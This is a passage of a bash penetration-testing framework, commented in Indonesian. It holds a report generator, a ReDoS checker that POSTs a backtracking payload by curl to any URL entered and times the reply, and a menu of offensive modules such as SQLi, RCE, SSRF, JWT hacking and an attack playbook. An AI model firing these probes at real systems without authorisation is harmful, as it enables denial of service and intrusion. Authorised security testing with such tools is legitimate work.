    [[ -n "$f_url" ]] && printf "%-20s | %-40s\n" "Firebase URL" "$f_url" >> "$filename" && echo -e "  [+] Terdeteksi Firebase"

    echo "-----------------------------------------------------" >> "$filename"
    echo -e "\n[*] Analisis Selesai. Temuan disimpan di: $filename"
    read -p "Tekan Enter untuk kembali ke menu..."
}
# --- [ MODUL 99: PROFESSIONAL DOMAIN-BASED REPORT GENERATOR ] ---

function start_report_generator {
    clear
    local nama_modul="MASTER REPORT"
    
    echo -e "\e[36m============================================================================="
    echo -e "          MODUL 99: PROFESSIONAL PENETRATION TEST REPORT GENERATOR           "
    echo -e "=============================================================================\e[0m"
    echo -e "\e[33m[INFO]:\e[0m Mengumpulkan data dari 20 modul untuk membuat laporan komprehensif."
    echo "-----------------------------------------------------------------------------"

    read -p "[?] Masukkan Keyword Domain Utama (contoh: safelinku): " target_keyword
    
    if [[ -z "$target_keyword" ]]; then
        echo -e "\e[31m[!] Error: Keyword tidak boleh kosong!\e[0m"
        return
    fi

    local report_file="FINAL_REPORT_${target_keyword^^}_$(date +%s).txt"

    echo -ne "[*] Sedang menyusun data dari semua modul... \r"
    sleep 2

    {
        echo "============================================================================="
        echo "              OFFENSIVE SECURITY ASSESSMENT REPORT (CONFIDENTIAL)            "
        echo "============================================================================="
        echo "TARGET DOMAIN  : $target_keyword"
        echo "GENERATE DATE  : $(date)"
        echo "AUDIT TYPE     : Black-Box Web Application Penetration Test"
        echo "VERSION        : 2.0 (Automated System)"
        echo "============================================================================="
        echo ""
        echo "1. EXECUTIVE SUMMARY"
        echo "--------------------"
        echo "Laporan ini merangkum hasil identifikasi kerentanan pada aset '$target_keyword'."
        echo "Metodologi yang digunakan mencakup Reconnaissance, Vulnerability Scanning,"
        echo "hingga Proof of Concept (PoC) pada sisi Server-Side maupun Client-Side."
        echo ""
        echo "2. TECHNICAL FINDINGS (AGGREGATED BY MODULES)"
        echo "----------------------------------------------"

        found_total=0
        
        # Array modul untuk iterasi pencarian data
        # Skrip akan mencari file log yang mengandung nama domain (format yang kita buat sebelumnya)
        for log_file in *"${target_keyword^^}"*.txt; do
            # Pastikan bukan file report itu sendiri
            if [[ -f "$log_file" && "$log_file" != "$report_file" ]]; then
                echo ""
                echo "[ SECTION: ${log_file//.txt/} ]"
                echo "-----------------------------------------------------------------------------"
                
                # Mengambil isi log, tapi membuang header log individu agar tidak double header
                grep -v "====" "$log_file" | grep -v "DATE" | grep -v "TARGET :" 
                
                echo "-----------------------------------------------------------------------------"
                ((found_total++))
            fi
        done

        if [ $found_total -eq 0 ]; then
            echo "[-] Tidak ditemukan file log mentah untuk keyword: $target_keyword"
            echo "    Pastikan Anda sudah menjalankan Modul 1-20 terlebih dahulu."
        fi

        echo ""
        echo "3. RISK RATING MATRIX"
        echo "---------------------"
        if [ $found_total -gt 10 ]; then
            echo "OVERALL SEVERITY : [ CRITICAL ]"
            echo "PRIORITY         : [ IMMEDIATE ACTION REQUIRED ]"
        elif [ $found_total -gt 0 ]; then
            echo "OVERALL SEVERITY : [ HIGH / MEDIUM ]"
            echo "PRIORITY         : [ REMEDIATE WITHIN 7 DAYS ]"
        else
            echo "OVERALL SEVERITY : [ LOW / INFORMATIONAL ]"
            echo "PRIORITY         : [ ROUTINE MAINTENANCE ]"
        fi

        echo ""
        echo "4. REMEDIATION PLAN"
        echo "-------------------"
        echo "- Selesaikan semua temuan VULNERABLE pada log teknis di Section 2."
        echo "- Perketat Web Application Firewall (WAF) untuk memblokir payload RCE/LFI."
        echo "- Implementasikan 'Principle of Least Privilege' pada API dan Database."
        echo "- Lakukan re-testing setelah patch diaplikasikan."
        echo ""
        echo "============================================================================="
        echo "             END OF REPORT - GENERATED BY PENTEST FRAMEWORK 2025             "
        echo "============================================================================="
    } > "$report_file"

    echo -e "\e[32m[✓] SUCCESS!\e[0m Laporan profesional telah disusun."
    echo -e "[>] File Laporan: \e[1m$report_file\e[0m"
    echo "-----------------------------------------------------------------------------"
    
    echo -e "\e[33m[!] Saran:\e[0m Laporan ini siap dikirim ke Bug Bounty Platform atau Client."
    read -p "Tekan Enter untuk kembali ke Menu Utama..."
}
#!/bin/bash

# Fungsi No. 22: ReDoS Security Auditor (Interactive Version)
# Deskripsi: Menguji kerentanan Application-DoS melalui input user.

function check_redos_vulnerability() {
    # Meminta Input dari User
    echo "-----------------------------------------------------"
    read -p "[?] Masukkan URL Target (contoh: http://site.com/api): " target_url
    read -p "[?] Masukkan Tingkat Intensitas (20-100, default 40): " intensity
    
    # Validasi input intensity
    intensity=${intensity:-40}

    # Validasi URL
    if [[ -z "$target_url" ]]; then
        echo "[!] Error: URL tidak boleh kosong!"
        return 1
    fi

    echo "[*] Memulai Audit Keamanan pada: $target_url"

    # 1. Membuat Payload 'Poison'
    # Teknik: Menghasilkan deretan karakter 'a' yang memicu backtracking
    local payload_string=$(printf 'a%.0s' $(seq 1 $intensity))
    local final_payload="${payload_string}!"

    echo "[+] Mengirimkan payload intensitas $intensity..."

    # 2. Mengukur Waktu Respon dengan Presisi Tinggi
    # Menggunakan /usr/bin/time untuk akurasi durasi eksekusi
    local start_time=$(date +%s.%N)
    
    # Mengirimkan request via cURL
    # -s: mode senyap, -w: format output khusus, -o /dev/null: buang body respon
    local status_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$target_url" \
         -H "Content-Type: application/json" \
         -d "{\"input\": \"$final_payload\"}")
    
    local end_time=$(date +%s.%N)
    
    # Menghitung selisih waktu
    local duration=$(echo "$end_time - $start_time" | bc)

    # 3. Laporan Hasil Analisis
    echo "[+] HTTP Status Code: $status_code"
    echo "[+] Waktu Respon Server: $duration detik"

    

    # Logika Analisis: Eksponensial vs Linear
    if (( $(echo "$duration > 7.0" | bc -l) )); then
        echo -e "\n[!!!] TEMUAN KRITIS: Server sangat lambat (Potensi ReDoS Tinggi)."
        echo "[!] Penjelasan: Input kecil menyebabkan CPU server macet."
    elif (( $(echo "$duration > 2.0" | bc -l) )); then
        echo -e "\n[!] PERINGATAN: Respon mulai melambat (Indikasi optimasi Regex buruk)."
    else
        echo -e "\n[SAFE] Respon server stabil. Tidak terdeteksi celah ReDoS dasar."
    fi
    echo "-----------------------------------------------------"
}
# --- [ BANNER UTAMA CALIBRATED ] ---
function show_banner {
    clear
    # Gradasi Cyan ke Biru Tua
    echo -e "\e[1;36m"
    echo "   ██╗    ██╗███████╗██████╗ ████████╗███████╗███████╗████████╗███████╗██████╗ "
    echo "   ██║    ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗"
    echo "   ██║ █╗ ██║█████╗  ██████╔╝   ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝"
    echo "   ██║███╗██║██╔══╝  ██╔══██╗   ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗"
    echo "   ╚███╔███╔╝███████╗██████╔╝   ██║   ███████╗███████║   ██║   ███████╗██  ██║"
    echo "    ╚══╝╚══╝ ╚══════╝╚═════╝    ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝"
    echo -e "\e[0m"
    echo -e "\e[1;90m   [ Powered by Gemini AI ]  [ Framework Version: 1.5 ]  [ 2025 ]\e[0m"
}
# --- [ LOOP MENU UTAMA: PROFESSIONAL VERSION ] ---

while true; do
    clear
    # Banner ASCII dengan gradasi warna (Cyan ke Biru)
    show_banner
    
    echo -e "\e[1;90m  [ Ver 1.5 Professional ]  [ Status: Multi-threaded Enabled ]  [ 2025 ]\e[0m"
    echo "============================================================================="
    echo -e " \e[1;31m[ SERVER-SIDE ]\e[0m                      \e[1;32m[ CLIENT-SIDE & CLOUD ]\e[0m"
    echo " [01] LFI Scanner                    [11] SSRF Tester"
    echo " [02] SQL Injection (SQLi)           [12] CORS Misconfig Scanner"
    echo " [03] Cross-Site Scripting (XSS)     [13] Subdomain Takeover"
    echo " [04] Admin Panel Finder             [14] Cloud Bucket (S3/GCP)"
    echo " [05] Sensitive File (.env/.git)     [15] API Endpoint Discovery"
    echo " [10] Remote Code Execution (RCE)    [20] JS Secrets Analysis"
    echo ""
    echo -e " \e[1;34m[ RECON & INFRA ]\e[0m                    \e[1;33m[ AUTH & ADVANCED ]\e[0m"
    echo " [06] Subdomain Enumerator           [16] IDOR Tester (Turbo)"
    echo " [07] Directory Bruter (Turbo)       [17] HTTP Request Smuggling"
    echo " [08] Port Scan & Services           [18] JWT Debugger & Hack"
    echo " [09] CMS Vulnerability Scan         [19] SSL & Security Headers"
    echo " [22] ReDoS Vulnerability            [21] ATTACK PLAYBOOK"
    echo "-----------------------------------------------------------------------------"
    echo -e " \e[1;36m[99] EXPORT PROFESSIONAL REPORT\e[0m      \e[1;31m[00] EXIT PROGRAM\e[0m"
    echo "============================================================================="
    
    # Prompt yang lebih interaktif
    echo -ne "\e[1;36mWEBTESTER\e[0m > \e[1;37mPilih Modul [01-22/99]: \e[0m"
    read menu_choice

    case $menu_choice in
        01|1) start_scanner ;;           # Modul 01
        02|2) start_sqli_tester ;;       # Modul 02
        03|3) start_xss_scanner ;;       # Modul 03
        04|4) start_admin_finder ;;      # Modul 04
        05|5) start_secret_hunter ;;     # Modul 05
        06|6) start_subdomain_scanner ;;  # Modul 06
        07|7) start_dir_bruter ;;        # Modul 07 (Turbo)
        08|8) start_port_scanner ;;      # Modul 08
        09|9) start_cms_scanner ;;       # Modul 09
        10) start_rce_scanner ;;         # Modul 10
        11) start_ssrf_tester ;;         # Modul 11
        12) start_cors_scanner ;;        # Modul 12
        13) start_takeover_hunter ;;     # Modul 13
        14) start_bucket_hunter ;;       # Modul 14
        15) start_api_discovery ;;       # Modul 15
        16) start_idor_tester ;;         # Modul 16 (Turbo)
        17) start_smuggling_tester ;;    # Modul 17
        18) start_jwt_hack ;;            # Modul 18
        19) start_security_audit ;;      # Modul 19
        20) start_js_scanner ;;          # Modul 20
        21) show_strategy ;;             # Modul 21
        22) check_redos_vulnerability ;; # Modul 22
        99) start_report_generator ;;    # Master Report Aggregator
        00|0) 
            echo -e "\n\e[33m[!] Membersihkan sesi...\e[0m"
            enable_sleep
            echo -e "\e[32m[✓] Terima kasih. Sampai jumpa di puncak!\e[0m"
            exit 0 ;;
        *)
            echo -e "\n\e[31m[!] Pilihan '$menu_choice' tidak tersedia.\e[0m"
            sleep 1 ;;
    esac
done
